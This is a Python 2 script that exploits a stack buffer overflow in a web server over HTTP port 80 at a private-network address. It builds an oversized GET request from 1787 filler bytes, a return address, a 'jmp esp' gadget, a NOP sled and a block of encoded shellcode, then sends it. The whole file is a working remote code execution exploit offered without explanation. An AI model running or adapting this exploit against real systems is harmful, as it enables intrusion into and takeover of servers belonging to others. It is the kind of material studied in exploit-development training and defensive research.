#!/usr/bin/python
#@intx0x80

import socket, sys

ip='192.168.99.4'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((ip, 80))

buffer = "GET "

shellcode=("\xdb\xdb\xbf\x2c\x1f\xfd\xaf\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x54\x83\xc6\x04\x31\x7e\x14\x03\x7e\x38\xfd\x08\x53\xa8\x83"
"\xf3\xac\x28\xe4\x7a\x49\x19\x24\x18\x19\x09\x94\x6a\x4f\xa5"
"\x5f\x3e\x64\x3e\x2d\x97\x8b\xf7\x98\xc1\xa2\x08\xb0\x32\xa4"
"\x8a\xcb\x66\x06\xb3\x03\x7b\x47\xf4\x7e\x76\x15\xad\xf5\x25"
"\x8a\xda\x40\xf6\x21\x90\x45\x7e\xd5\x60\x67\xaf\x48\xfb\x3e"
"\x6f\x6a\x28\x4b\x26\x74\x2d\x76\xf0\x0f\x85\x0c\x03\xc6\xd4"
"\xed\xa8\x27\xd9\x1f\xb0\x60\xdd\xff\xc7\x98\x1e\x7d\xd0\x5e"
"\x5d\x59\x55\x45\xc5\x2a\xcd\xa1\xf4\xff\x88\x22\xfa\xb4\xdf"
"\x6d\x1e\x4a\x33\x06\x1a\xc7\xb2\xc9\xab\x93\x90\xcd\xf0\x40"
"\xb8\x54\x5c\x26\xc5\x87\x3f\x97\x63\xc3\xad\xcc\x19\x8e\xb9"
"\x21\x10\x31\x39\x2e\x23\x42\x0b\xf1\x9f\xcc\x27\x7a\x06\x0a"
"\x48\x51\xfe\x84\xb7\x5a\xff\x8d\x73\x0e\xaf\xa5\x52\x2f\x24"
"\x36\x5b\xfa\xd1\x33\xcb\xc5\x8e\x5f\x0e\xae\xcc\x9f\x01\x72"
"\x58\x79\x71\xda\x0a\xd6\x31\x8a\xea\x86\xd9\xc0\xe4\xf9\xf9"
"\xea\x2e\x92\x93\x04\x87\xca\x0b\xbc\x82\x81\xaa\x41\x19\xec"
"\xec\xca\xa8\x10\xa2\x3a\xd8\x02\xd2\x5a\x22\xdb\x22\xf7\x22"
"\xb1\x26\x51\x74\x2d\x24\x84\xb2\xf2\xd7\xe3\xc0\xf5\x27\x72"
"\xf1\x8e\x11\xe0\xbd\xf8\x5d\xe4\x3d\xf9\x0b\x6e\x3e\x91\xeb"
"\xca\x6d\x84\xf4\xc6\x01\x15\x60\xe9\x73\xc9\x23\x81\x79\x34"
"\x03\x0e\x81\x13\x10\x49\x7d\xe1\x34\xf2\x16\x19\x78\x02\xe7"
"\x73\x78\x52\x8f\x88\x57\x5d\x7f\x70\x72\x36\x17\xfb\x12\xf4"
"\x86\xfc\x3f\x58\x17\xfc\xb3\x41\x4e\x73\x34\x76\x6f\x75\x09"
"\xa0\x56\x03\x4a\x70\xed\x1c\xe1\xd5\x44\xb7\x09\x49\x96\x92")
buffer+="A"*1787
buffer+="\x69\x10\x41\x7e" # ret

#buffer+="\x53\x93\x42\x7e" # jmp esp

buffer+="\x53\x93\x42\x7e" # jmp esp

buffer+="\x90"*20
buffer+=shellcode
buffer += "  HTTP/1.1\r\n\r\n"


sock.send(buffer)


sock.close()



